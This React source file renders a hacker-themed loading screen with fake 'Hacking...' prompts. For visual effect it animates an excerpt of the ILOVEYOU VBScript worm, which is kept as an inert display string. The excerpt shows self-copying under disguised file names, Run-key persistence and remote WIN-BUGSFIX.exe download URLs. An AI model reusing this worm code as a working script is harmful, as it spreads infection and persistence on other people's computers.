import { Box, Center, Flex, Text } from "@chakra-ui/react";
import { ScaleToRightBox } from "@/styles/animations/ScaleToRightBox";
import { useEffect, useState, useRef } from "react";

import { motion } from "framer-motion";

const codeSnippet = `
rem  <i hate going to school>
On Error Resume Next

Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq = ""
ctr = 0

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
vbscopy = file.ReadAll

main()

Sub main()
  On Error Resume Next
  Dim wscr, rr
  Set wscr = CreateObject("WScript.Shell")
  rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")

  If (rr >= 1) Then
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  End If

  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)

  c.Copy(dirsystem & "\MSKernel32.vbs")
  c.Copy(dirwin & "\Win32DLL.vbs")
  c.Copy(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")

  regruns()
  html()
  spreadtoemail()
  listadriv()
End Sub

Sub regruns()
  On Error Resume Next
  Dim num, downread

  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"

  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

  If (downread = "") Then
    downread = "c:\"
  End If

  If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
    Randomize
    num = Int((4 * Rnd) + 1)

    If num = 1 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    ElseIf num = 2 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    ElseIf num = 3 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
    ElseIf num = 4 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    End If
  End If

  If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
  End If
End Sub

Sub listadriv()
  On Error Resume Next
  Dim d, dc, s

  Set dc = fso.Drives

  For Each d In dc
    If (d.DriveType = 2) Or (d.DriveType = 3) Then
      folderlist(d.path & "\")
    End If
  Next

  listadriv = s
End Sub
`;

function PopCode() {
  const [lines, setLines] = useState([]);
  const [currentIndex, setCurrentIndex] = useState(0);

  useEffect(() => {
    const splitCode = codeSnippet.split("\n");

    const interval = setInterval(() => {
      if (currentIndex < splitCode.length) {
        setLines((prevLines) => [...prevLines, splitCode[currentIndex]]);
        setCurrentIndex((prevIndex) => prevIndex + 1);
      }
    }, 30);

    return () => clearInterval(interval);
  }, [currentIndex]);

  return (
    <Flex
      direction="column"
      position="absolute"
      top={10}
      left={10}
      overflow="hidden"
      maxH="90%"
    >
      {lines.map((line, index) => (
        <Text
          color="#DB3E39a"
          fontFamily="monospace"
          as={motion.div}
          key={index}
          initial={{ opacity: 0, y: 20 }} // Starts off screen
          animate={{ opacity: 1, y: 0 }} // Fades and moves up into view
          exit={{ opacity: 0, y: -20 }} // Moves up and fades out as it leaves
          transition={{ duration: 0.001 }}
        >
          {line}
        </Text>
      ))}
    </Flex>
  );
}

export default function Loading() {
  const prompts = [
    "Scanning network for vulnerabilities",
    "Bundling malware",
    "Delivering payload to target",
    "Installing backdoor",
    "Gaining root access to system",
  ];

  const [currPrompt, setCurrPrompt] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrPrompt((prev) => prev + 1);
    }, 500);

    return () => {
      clearInterval(interval);
    };
  }, []);

  return (
    <Center h="100vh">
      <Flex
        direction="column"
        textAlign="center"
        bg="gray.900"
        padding="2em"
        borderTop="14px solid"
        borderBottom="1px solid"
        borderRight="1px solid"
        borderLeft="1px solid"
        borderColor="terminal.green"
        boxShadow="-5px 7px 4px 4px #00000050"
        zIndex={1}
      >
        <Text fontSize={36} color="terminal.green">
          Hacking...
        </Text>

        <Text fontSize={18} color="terminal.green" mb="32px">
          {prompts?.[currPrompt]}
        </Text>

        <Box position="relative" width="512px" h="28px">
          <ScaleToRightBox
            transitionTime="2.5s"
            widthScale="100%"
            position="absolute"
            bg="terminal.green"
            top="calc(50% - 10px)"
            left="1%"
            h="20px"
            w="98%"
            boxShadow="0px 0px 50px 10px #4EF531CA"
            borderRadius="1px"
            zIndex={1}
          />
          <ScaleToRightBox
            transitionTime=".01s"
            widthScale="100%"
            bg="gray.700"
            minH="28px"
            w="100%"
            borderRadius="1px"
          />
        </Box>
      </Flex>

      <PopCode />
    </Center>
  );
}
